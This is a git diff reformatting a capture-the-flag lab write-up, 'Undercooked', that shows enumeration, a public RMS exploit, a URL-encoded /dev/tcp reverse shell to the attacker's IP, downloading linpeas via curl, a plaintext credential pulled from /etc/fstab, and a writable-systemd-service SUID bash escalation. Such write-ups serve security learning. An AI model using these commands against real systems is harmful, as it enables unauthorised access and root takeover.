@@ -1,5 +1,7 @@
-Undercooked
+# Undercooked
 
+## Enumeration
+```bash
 └─$ sudo nmap -sS -A -p- 10.10.21.81
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 23:05 BST
 Nmap scan report for 10.10.21.81
@@ -28,17 +30,22 @@ TRACEROUTE (using port 22/tcp)
 HOP RTT      ADDRESS
 1   31.48 ms 10.8.0.1
 2   31.74 ms 10.10.21.81
+```
 
-gobuster : /kitchen
-
+### Gobuster gives me this path : /kitchen
+```bash
 searchsploit RMS
 
 sudo python 47520.py <IP>:<PORT>/kitchen
+```
+## Exploitation
+### I did a reverse shell but url encoded
+```sh -i >& /dev/tcp/10.8.37.214/4447 0>&1 = sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.37.214%2F4447%200%3E%261```
 
-url encoder = sh -i >& /dev/tcp/10.8.37.214/4447 0>&1 = sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.37.214%2F4447%200%3E%261
+### I got a reverse shell
 
-get a reverseshell
-
+### I upgrade it
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 sh-4.2$ cat config.php
@@ -51,20 +58,28 @@ cat config.php
     define('APP_NAME', 'Onion Kingdom');
     error_reporting(1);
 ?>
-wget is unknown on the machine so i use curl
-
+```
+## Privilege Escalation
+### I download linpeas on the target machin
+```bash
 curl -0 http://10.8.37.214/linpeas.sh > linpeas.sh
 
-linpeas
+./linpeas
 
 /etc/fstab:#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=kevin,password=ThisIsAnImpossibleToFindPassword,domain=localdomain,soft	0 0
+```
+### I went on the onion ssh session
 
+```bash
 ssh onion@<IP>
+```
 
-EPI{Ph0r_S0Up_CU7_0N10ns_7h47s_17}
+## User FLAG
 
-You have write privileges over /etc/systemd/system/kitchen.service
+```cat user.txt``` : EPI{Ph0r_S0Up_CU7_0N10ns_7h47s_17}
 
+### I have write privileges over /etc/systemd/system/kitchen.service
+```
 sudo /usr/sbin/reboot
 
 ./bash -p (execute with suid permission)
@@ -79,3 +94,7 @@ ExecStart=/bin/bash -c 'cp /bin/bash /home/onion/bash; chmod +xs /home/onion/bas
 
 [Install]
 WantedBy=multi-user.target
+```
+
+## Root FLAG
+I forgot to write it :(
